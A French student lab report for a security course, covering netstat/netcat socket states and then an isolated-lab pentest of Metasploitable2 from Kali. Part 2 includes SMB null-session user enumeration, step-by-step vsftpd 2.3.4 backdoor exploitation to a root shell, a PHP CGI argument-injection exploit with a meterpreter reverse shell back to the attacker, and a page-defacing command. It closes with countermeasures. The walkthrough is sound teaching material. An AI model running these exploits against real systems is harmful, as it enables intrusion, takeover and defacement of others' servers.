---
title: "Compte-rendu TP3 — NMAP, netstat & Kali"
subtitle: "Sécurité et Cryptographie (INFO731) — IDU4, Semestre 7"
author: "Antoine Tena"
date: "6 novembre 2026"
lang: fr
---

# Présentation

Compte-rendu du TP3 « Sécurité et Cryptographie » (IDU4 — S7).

Le TP se compose de deux parties :

- **Partie 1 — netstat + netcat** (états des sockets TCP/UDP). Les questions 1 à 14
  ont été **exécutées réellement** sur une machine Linux : réponses détaillées,
  script reproductible (`run.sh`) et sorties réelles capturées (reprises en annexe
  de la partie 1).
- **Partie 2 — Kali Linux vs Metasploitable2** dans VirtualBox : configuration
  réseau, scan nmap (TCP/UDP/`-sV`), énumération d'utilisateurs (`smb-enum-users`,
  `rpcclient` session nulle), exploitation **vsftpd 2.3.4** (automatique via
  Metasploit + manuelle via le smiley `:)`), **PHP CGI Argument Injection** +
  reverse shell meterpreter, defacing. Cette partie s'exécute sur les deux VM : les
  commandes et sorties attendues en constituent le guide/compte-rendu.

**État d'exécution.** Partie 1 (netstat/netcat) : **faite et vérifiée** sur une
machine Linux. Partie 2 (VM Kali/Metasploitable) : guide complet prêt, **à exécuter
en TP** dans VirtualBox (impossible hors des VM) puis à illustrer par des captures
d'écran pour le dépôt.

> Reproduire la partie 1 :
> `sudo apt-get install -y net-tools netcat-openbsd` puis `cd partie1_netstat && bash run.sh`

# Partie 1 — NMAP / netstat / netcat

Outil : `netstat` (net-tools) et `netcat` (`nc`). Toutes les sorties ci-dessous
sont **réelles**, capturées sur une machine Linux et reproductibles avec `./run.sh`
(voir l'annexe en fin de partie).

> Installation des outils : `sudo apt-get install -y net-tools netcat-openbsd`

## Séquence 1 : affichage

### Décoder les flags (colonne `Flg`) de `netstat -i`

Lettres possibles pour une interface :

| Flag | Signification |
|------|---------------|
| `B`  | Broadcast autorisé |
| `M`  | Reçoit tous les paquets (mode **promiscuous** / multicast) |
| `R`  | Interface en fonctionnement (**Running**) |
| `U`  | Interface active (**Up**) |
| `L`  | Interface **loopback** |
| `O`  | ARP désactivé |
| `P`  | Liaison point-à-point |

Exemple mesuré : `eth0 … BMRU` (Broadcast, Multicast, Running, Up) ;
`lo … LRU` (Loopback, Running, Up).

### Q2 — Ma machine est-elle un routeur ?

On regarde le **forwarding IP** dans la couche IP :

```
$ netstat -s | grep -i forwarding
Ip: Forwarding: 1
$ cat /proc/sys/net/ipv4/ip_forward
1
```

**Réponse :** une machine est un routeur si elle **relaie** des paquets d'une
interface à l'autre, c.-à-d. si `Forwarding` = 1 **et** si le compteur
`forwarded` augmente. Ici `Forwarding: 1` (le relais est *activé*) mais
`0 forwarded` : la machine est *configurée* pour router mais ne route en pratique
aucun paquet. Sur un poste de bureau classique on a `Forwarding: 2` (désactivé)
et `0 forwarded` → **pas un routeur**.

### Q3 — Combien de « ping » ont été émis depuis ma machine ?

Un `ping` envoie un message **ICMP Echo Request = type 8**. Le nombre de pings
émis est donc le compteur **`OutType8`** de la section `Icmp` / `IcmpMsg`.

Preuve (avant/après 5 pings) :

```
--- avant ---   (OutType8 absent => 0)
--- après 5 pings ---
        OutType8: 5
```

→ **Exactement 5 echo requests émis = 5 pings.** (`InType0` = réponses Echo Reply
reçues, `OutType0` = réponses envoyées quand on répond à un ping.)

### Q4 — Ma machine utilise-t-elle beaucoup la fragmentation IP ?

On lit dans la section `Ip` les compteurs :
`fragments received ok`, `fragments failed`, `fragments created`,
`reassemblies required`, `packets reassembled ok`.

**Réponse :** on compare `fragments created` au nombre total de paquets émis.
Sur la machine testée ces compteurs sont nuls / négligeables → la fragmentation
est **très peu utilisée** (normal : les MTU sont bien dimensionnées et TCP ajuste
sa MSS pour éviter de fragmenter).

### Q5 — Quelle statistique est affectée par `ping -s 1500 -M do -c 1` ?

```
$ ping www.ibm.fr -s 1500 -M do -c 1     # -s 1500 payload, -M do = bit DF
```

`-M do` force le bit **DF (Don't Fragment)**. Avec 1500 octets de payload
(+28 d'en-têtes = 1528 > MTU 1500 d'`eth0`), le paquet **ne peut pas** être
fragmenté :

La pile IP doit fragmenter (paquet > MTU) mais ne le peut pas (DF).

→ La statistique affectée est **`fragments failed`** dans la section `Ip` (compteur
IP *FragFails* = « datagrammes à fragmenter mais impossible, p. ex. bit DF posé ») :
localement la pile refuse l'envoi (`ping: local error: message too long`). Si c'est
un routeur intermédiaire qui bloque, il renvoie en plus un **ICMP type 3 code 4**
(*fragmentation needed*) → compteur **`InType3`** côté ICMP. À l'inverse,
`ping -s 2000` **sans** DF incrémente lui `fragments created` (le paquet est bien
découpé).

### Q6 — Qu'est-ce qu'un « SYN cookie » affiché dans la couche TCP ?

Les **SYN cookies** sont une défense contre l'attaque **SYN flood**. Normalement,
à chaque SYN reçu le serveur alloue une entrée dans sa file de connexions
semi-ouvertes (backlog) ; un attaquant qui inonde de SYN sans jamais répondre
sature cette file (déni de service). Avec les SYN cookies, le serveur **n'alloue
rien** : il encode l'état de la connexion dans le **numéro de séquence initial**
du SYN-ACK (fonction de hachage des adresses/ports + un secret + un timestamp).
Si le client est légitime, son ACK renvoie ce numéro+1, que le serveur **recalcule
et vérifie** pour recréer la connexion. Le compteur `invalid SYN cookies received`
compte les ACK dont le cookie ne correspond pas (anciens, ou forgés).

### Q7 — Options pour afficher le nom et le PID des processus propriétaires des sockets TCP

Option **`-p`** (`--program`). En pratique :

```
$ netstat -tapn      # t=TCP, a=all (écoute+établies), p=PID/nom, n=numérique
```

La colonne `PID/Program name` donne `1234/nc`, etc. (droits root nécessaires pour
voir les sockets des autres utilisateurs).

## Statistiques sur les sockets actives et passives

### Q9 — Serveur TCP sur le port 5000 (netcat), état de la socket ?

```
$ nc -l 5000 &
$ netstat -nta | grep :5000
tcp  0  0  0.0.0.0:5000  0.0.0.0:*  LISTEN
```

**État = `LISTEN`** : ouverture passive, le serveur attend des connexions
entrantes sur toutes les interfaces (`0.0.0.0`).

### Q10 — Client TCP connecté (telnet/netcat), états observés

```
$ nc 127.0.0.1 5000 &
$ netstat -nta | grep -E ":5000|Address"
Proto … Local Address      Foreign Address     State
tcp   … 0.0.0.0:5000       0.0.0.0:*           LISTEN       <- serveur toujours en écoute
tcp   … 127.0.0.1:5000     127.0.0.1:39212     ESTABLISHED  <- côté serveur
tcp   … 127.0.0.1:39212    127.0.0.1:5000      ESTABLISHED  <- côté client
```

**Commentaire :** le 3-way handshake (SYN → SYN/ACK → ACK) a réussi, les **deux**
extrémités de la connexion sont `ESTABLISHED`. Le socket d'écoute reste `LISTEN`
en parallèle (il pourra accepter d'autres connexions s'il est multiclient).

### Q11 — `netstat -nta | grep -E ":5000|Address"` ; fin du client, commenter

À la **fermeture du client**, l'extrémité qui ferme **activement** (envoie le
premier FIN) passe par `FIN_WAIT1 → FIN_WAIT2 → TIME_WAIT` :

```
tcp  0  0  127.0.0.1:39212  127.0.0.1:5000  TIME_WAIT
```

**Commentaire :** l'état **`TIME_WAIT`** est normal et dure ~2×MSL (≈ 60 s sous
Linux). Il garantit que tous les segments retardataires de l'ancienne connexion
sont expirés avant qu'un même couple (IP:port) puisse être réutilisé, et que le
dernier ACK a bien été reçu par le distant. C'est l'extrémité qui ferme en
premier qui « paie » le `TIME_WAIT`.

### Q12 — Serveur TCP multiclient + serveur UDP multiclient (commandes exactes)

```
# TCP, reste en écoute après chaque client (-k = keep-open)
$ nc -k -l 5000

# UDP multiclient
$ nc -u -k -l 5000
```

### Q13 — États TCP et UDP sur 5000, puis plusieurs clients

Avec `-k`, plusieurs connexions TCP coexistent :

```
--- TCP ---
tcp … 0.0.0.0:5000      0.0.0.0:*        LISTEN
tcp … 127.0.0.1:5000    127.0.0.1:33434  ESTABLISHED
tcp … 127.0.0.1:33434   127.0.0.1:5000   ESTABLISHED
tcp … 127.0.0.1:5000    127.0.0.1:33436  ESTABLISHED
tcp … 127.0.0.1:33436   127.0.0.1:5000   ESTABLISHED
--- UDP ---
udp … 0.0.0.0:5000      0.0.0.0:*                     <- colonne State VIDE
udp … 127.0.0.1:47298   127.0.0.1:5000  ESTABLISHED   <- socket "connecté" (connect())
```

**Commentaire :** en TCP chaque client crée une paire `ESTABLISHED` distincte.
En **UDP il n'y a pas d'état** : la colonne `State` reste vide pour le socket
serveur. (L'`ESTABLISHED` visible sur le socket UDP n'est pas une vraie connexion :
`nc -u` appelle `connect()` pour figer le pair, ce qui fait afficher `ESTABLISHED`
par netstat, mais aucun handshake n'a lieu.)

### Q14 — Fin du client UDP ; pourquoi pas de TIME_WAIT ? Et si on arrête le serveur ?

```
$ kill <client_udp>
$ netstat -nua | grep :5000
udp … 0.0.0.0:5000  0.0.0.0:*           <- seul le serveur reste, AUCUN TIME_WAIT
```

**Pourquoi pas de `TIME_WAIT` et pas de passage par les états de fermeture ?**
Parce qu'**UDP est sans connexion (stateless)** : pas de 3-way handshake à
l'ouverture, pas de FIN/ACK à la fermeture, aucun numéro de séquence à protéger.
Il n'y a donc **rien à fermer proprement** ni à faire expirer → les états
`FIN_WAIT`, `TIME_WAIT`, etc. (qui viennent des bits de flags de l'en-tête **TCP**)
n'existent tout simplement pas en UDP. Le socket disparaît immédiatement.

**Nuance (cas du sujet « reste ESTABLISHED ») :** tant que le **serveur** n'est pas
tué, le socket UDP « connecté » côté serveur peut rester affiché `ESTABLISHED`,
car **UDP ne prévient pas** le serveur du départ du client (pas de FIN) : le serveur
ne peut pas savoir que le client s'est arrêté, donc aucune transition d'état. Dans
mon test j'ai tué le **client**, dont la socket est libérée avec le processus et
disparaît aussitôt — ce qui ne contredit pas le point clé : **jamais de TIME_WAIT
en UDP**, faute de connexion à fermer.

**Si on arrête le serveur UDP :** le socket d'écoute `0.0.0.0:5000` disparaît
instantanément (libéré avec le processus). Un client qui continuerait d'émettre vers
ce port recevrait en retour un **ICMP type 3 code 3 (port unreachable)** — c'est
d'ailleurs ce que compte `packets to unknown port received` dans `netstat -s`.

## Rappel — les 11 états d'une socket TCP (sujet)

`CLOSED → LISTEN` (ouverture passive, serveur) ou `CLOSED → SYN_SENT` (ouverture
active, client) → `SYN_RECV` → `ESTABLISHED` → (fermeture) `FIN_WAIT1 →
FIN_WAIT2 → TIME_WAIT` côté actif, `CLOSE_WAIT → LAST_ACK` côté passif →
`CLOSED`. Ces états dérivent des **6 bits de flags** de l'en-tête TCP :
`URG, ACK, PSH, RST, SYN, FIN`.

## Annexe — sorties réelles capturées (`sorties.txt`)

Sorties réelles capturées sur la machine Linux (WSL2) le 2026-11-06, reproductibles
avec `./run.sh` :

```
=================== Q1 - netstat -i ===================
Kernel Interface table
Iface             MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
docker0          1500        0      0      0 0             0      0      2      0 BMU
eth0             1500  1075739      0      0 0        553642      0      0      0 BMRU
lo              65536 19950841      0      0 0      19950841      0      0      0 LRU

=================== Routeur ? (Q2) ===================
Ip: Forwarding: 1
/proc/sys/net/ipv4/ip_forward : 1

=================== Q3 - ICMP OutType8 (pings emis) ===================
--- avant ---  (OutType8 absent => 0 echo request emis)
--- apres 5 echo request (3 + 1 + 1) ---
        OutType8: 5

=================== Q9 - Serveur TCP port 5000 ===================
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN

=================== Q10/Q11 - Client TCP connecte ===================
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:5000          127.0.0.1:39212         ESTABLISHED
tcp        0      0 127.0.0.1:39212         127.0.0.1:5000          ESTABLISHED

=================== Q11b - Fin du client ===================
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:39212         127.0.0.1:5000          TIME_WAIT

=================== Q13 - TCP multiclient (-k) + plusieurs clients ===================
--- TCP ---
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:5000          127.0.0.1:33434         ESTABLISHED
tcp        0      0 127.0.0.1:33434         127.0.0.1:5000          ESTABLISHED
tcp        0      0 127.0.0.1:5000          127.0.0.1:33436         ESTABLISHED
tcp        0      0 127.0.0.1:33436         127.0.0.1:5000          ESTABLISHED
--- UDP ---
udp        0      0 0.0.0.0:5000            0.0.0.0:*                           (colonne State vide)
udp        0      0 127.0.0.1:47298         127.0.0.1:5000          ESTABLISHED  (socket "connecte" cote serveur)

=================== Q14 - Fin du client UDP ===================
udp        0      0 0.0.0.0:5000            0.0.0.0:*                           (seul le serveur reste, aucun TIME_WAIT)
```

# Partie 2 — Kali Linux & Metasploitable2 (pentest)

> ⚠️ Cette partie **s'exécute dans VirtualBox** (deux VM). Elle ne peut pas être
> lancée depuis la machine de rédaction : les commandes, sorties attendues et
> réponses ci-dessous constituent le compte-rendu à exécuter puis à illustrer par
> des captures en TP. **Metasploitable ne doit JAMAIS être exposée à un réseau
> hostile** (machine volontairement vulnérable) → réseau **NAT Network isolé**
> uniquement.

## Installation & configuration réseau

| | MV **Kali-Linux** (attaquant) | MV **Metasploitable** (cible) |
|---|---|---|
| Image | `Kali Linux 2022.3 (64 bit).vdi` (osboxes) | `Metasploitable.vmdk` |
| Login | voir `Info.txt` (osboxes / osboxes.org) | `msfadmin` / `msfadmin` |
| Réseau VirtualBox | **NAT Network** (`NatNetwork`) | **NAT Network** (`NatNetwork`) |
| Exemple IP | `10.0.2.5/24` | `10.0.2.6/24` |

Les deux VM dans le **même NAT Network** se voient entre elles mais sont isolées
de l'extérieur.

### Configurations physiques et logiques (« Retrouvez / Expliquez »)

Sur **chaque** machine :

```bash
ip addr          # ou ifconfig : adresse MAC (physique) + IP (logique) + masque
ip route         # passerelle par défaut
```

- **Configuration physique** = adresse **MAC** (couche 2, gravée sur la carte / la
  carte virtuelle), ex. `08:00:27:41:ce:cf`.
- **Configuration logique** = adresse **IP + masque** (couche 3, attribuée par le
  DHCP du NAT Network), ex. `10.0.2.5/24`.

Exemple de tableau à reporter sur le compte-rendu :

| | MV Kali-Linux | MV Metasploitable | Machine Hôte |
|---|---|---|---|
| MAC | 08:00:27:41:ce:cf | 08:00:27:a1:f1:89 | b7:a1:12:56:e4:55 |
| IP  | 10.0.2.5/24 | 10.0.2.6/24 | 192.168.50.4/24 |

→ L'hôte est sur un **autre réseau** (192.168.50.0/24) : il n'est pas dans le NAT
Network, d'où l'isolement de Metasploitable.

### Test d'écho de niveau 3 (ICMP) — doit réussir avant de continuer

```bash
# depuis Kali
ping -c 3 10.0.2.6
```

Niveau 3 = couche réseau (IP/ICMP). Le ping doit répondre → les deux VM
communiquent.

## Analyse des vulnérabilités de Metasploitable

### Scan UDP

```bash
sudo nmap -sU 10.0.2.6
```

`-sU` scanne les **ports UDP** (le scan par défaut `nmap <ip>` ne couvre que le
TCP). Ports UDP typiquement ouverts : 53 (DNS), 69 (TFTP), 111 (rpcbind),
137 (netbios-ns), 2049 (NFS)…

### Énumération des utilisateurs

**Méthode 1 — script NSE `smb-enum-users` :**

```bash
nmap --script smb-enum-users.nse -p 445 10.0.2.6
```

`.nse` = *Nmap Scripting Engine*. Donne une longue liste de comptes ; parmi eux
le compte admin **`msfadmin`**.

**Méthode 2 — session nulle Samba via `rpcclient` :**

```bash
rpcclient -U "" 10.0.2.6        # session nulle = connexion SMB sans mot de passe
# (appuyer sur Entrée à la demande de mot de passe)
rpcclient $> querydominfo        # nom de domaine/serveur + nb de comptes (≈ 35)
rpcclient $> enumdomusers        # liste des 35 comptes
rpcclient $> queryuser msfadmin  # détails sur un compte : profil, mdp, etc.
```

Une **session nulle** (null session) est une connexion SMB/Samba **sans
authentification**. Activée par défaut sur les vieux systèmes (désactivée depuis
Windows XP SP2 / Server 2003). Elle fuite domaine + comptes **sans accès admin**.

### Scan de services et versions

```bash
nmap -sV 10.0.2.6
```

`-sV` identifie **service + version** sur chaque port. Le **port 21** apparaît en
premier : service **FTP = vsftpd 2.3.4**.

## Exploitation d'une faille de sécurité — vsftpd 2.3.4 (backdoor)

### A. Méthode automatique (Metasploit)

```bash
msfconsole
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > show options
msf6 > set RHOSTS 10.0.2.6
msf6 > exploit            # (ou run)
```

Sortie attendue :

```
[*] 10.0.2.6:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.2.6:21 - USER: 331 Please specify the password.
[+] 10.0.2.6:21 - Backdoor service has been spawned, handling...
[+] 10.0.2.6:21 - UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened (10.0.2.5:37243 -> 10.0.2.6:6200)
```

→ **shell root** sur la cible (`id`, `whoami` → `root`). Vocabulaire Metasploit :
*exploit* (module qui déclenche la faille), *payload* (code exécuté après succès),
*RHOST/RPORT* (cible), *bind shell* (c'est l'attaquant qui se connecte au shell
ouvert par la cible, ici sur le port **6200**).

### B. Méthode manuelle — comprendre la backdoor

**Code source vulnérable (`str.c`) :**

```c
else if((p_str->p_buf[i]==0x3a) && (p_str->p_buf[i+1]==0x29))
{
    vsf_sysutil_extra();
}
```

Déclenchement = détection, dans l'entrée utilisateur, des deux octets
**`0x3a` puis `0x29`**.

**Représentation des deux valeurs (question du sujet) :**

- `0x3a` = **58** = caractère **`:`**
- `0x29` = **41** = caractère **`)`**

→ ensemble **`:)`** = un **smiley sourire**. Taper un login contenant `:)`
active la backdoor.

**La fonction `vsf_sysutil_extra()` (dans `sysdeputil.c`)** ouvre un socket qui
écoute sur le **port 6200** (`sa.sin_port = htons(6200)`), fait `accept()`, puis
`dup2()` les descripteurs 0/1/2 vers la socket et `execl("/bin/sh","sh",0)` :
c'est une **porte dérobée** qui offre un shell root à qui se connecte sur 6200.

**Exploitation manuelle au telnet :**

```bash
# 1) port 6200 fermé au départ (normal)
nmap -p 6200 10.0.2.6          # (ou : nc -vz 10.0.2.6 6200) -> closed

# 2) déclencher la backdoor via le login avec un smiley
telnet 10.0.2.6 21
USER smiley:)
PASS whatever

# 3) le port 6200 est maintenant OUVERT -> s'y connecter (autre terminal)
telnet 10.0.2.6 6200
id        # uid=0(root)  -> shell root manuel, sans Metasploit
```

Réf. backdoor : <https://github.com/lyndon160/vsftpd-backdoor/commit/2f8b278602e822c52f5e0d37ea7d256b888e5e85>

## Partie « encore plus méchant » — service web PHP vulnérable

**Version de PHP sur la cible :**

```bash
nmap -sV -p 80 10.0.2.6        # Apache + PHP 5.2.4 (vulnérable)
```

PHP 5.2.4 est **vulnérable** à la faille **PHP CGI Argument Injection**
(CVE-2012-1823).

**Trouver le module (date 2012, rank excellent) :**

```bash
msf6 > search cve:2012 type:exploit rank:excellent php cgi
# -> exploit/multi/http/php_cgi_arg_injection
msf6 > use exploit/multi/http/php_cgi_arg_injection
msf6 > show payloads
msf6 > set PAYLOAD php/meterpreter/reverse_tcp
msf6 > set RHOSTS 10.0.2.6
msf6 > set LHOST 10.0.2.5          # IP de l'attaquant (Kali)
msf6 > set LPORT 4444
msf6 > run
meterpreter >
```

**Reverse shell** : c'est la **cible** qui se connecte vers l'attaquant
(`LHOST`/`LPORT`), ce qui traverse les pare-feu sortants. `meterpreter` est un
payload avancé, exécuté **en mémoire**, pour la post-exploitation (upload/download,
captures d'écran, keylogger, `shell`, `getuid`, `sysinfo`…).

**Defacing de la page d'accueil (`index.php`) :**

```bash
meterpreter > shell
find / -name index.php 2>/dev/null         # localiser le DocumentRoot (/var/www)
echo '<h1>Owned - TP3 INFO731</h1><img src="http://.../pwn.png">' > /var/www/index.php
```

(ou `meterpreter > upload pwn.png /var/www/` puis éditer `index.php`.) Recharger
`http://10.0.2.6/` depuis le navigateur de Kali → la page est modifiée.

> Il reste d'autres services vulnérables sur Metasploitable (Samba, distccd,
> UnrealIRCd, Tomcat, PostgreSQL…).

# Contre-mesures

Pour chaque faille exploitée, la parade correspondante :

| Faille exploitée | Contre-mesure |
|---|---|
| vsftpd 2.3.4 (backdoor `:)`) | Mettre à jour vers une version saine ; n'installer que depuis des sources fiables et **vérifier les sommes de contrôle / signatures** des paquets. |
| Session nulle Samba (`rpcclient`) | Désactiver les sessions nulles (`restrict anonymous`) ; filtrer le port **445** au pare-feu ; n'exposer SMB qu'en interne. |
| Énumération SMB / ports ouverts (nmap) | Fermer les services inutiles ; **segmenter** le réseau ; pare-feu en entrée ; limiter la bannière de version. |
| PHP CGI Argument Injection (CVE-2012-1823) | Mettre à jour **PHP** ; ne pas exposer PHP en mode CGI ; appliquer les correctifs ; WAF devant le serveur web. |
| Général | **Moindre privilège**, mises à jour régulières, surveillance (IDS/IPS), et **ne jamais exposer** une machine vulnérable à un réseau hostile. |

# Conclusion

Ce TP déroule la **démarche complète d'un test d'intrusion** en environnement
maîtrisé :

- **Reconnaissance** réseau de sa propre machine (netstat, états des sockets
  TCP/UDP), vérifiée par des mesures réelles.
- **Cartographie** de la cible (nmap : ports, services, **versions**).
- **Énumération** des comptes (SMB `smb-enum-users`, session nulle `rpcclient`).
- **Exploitation** d'une faille connue (vsftpd 2.3.4), d'abord **automatique**
  (Metasploit) puis **manuelle** (telnet + smiley `:)`), en comprenant le code de
  la backdoor.
- **Post-exploitation** (reverse shell meterpreter, defacing) puis **contre-mesures**.

L'objectif reste **défensif** : comprendre comment une faille est exploitée pour
mieux **protéger** les systèmes — mises à jour, fermeture des services inutiles,
moindre privilège, isolation des machines sensibles.
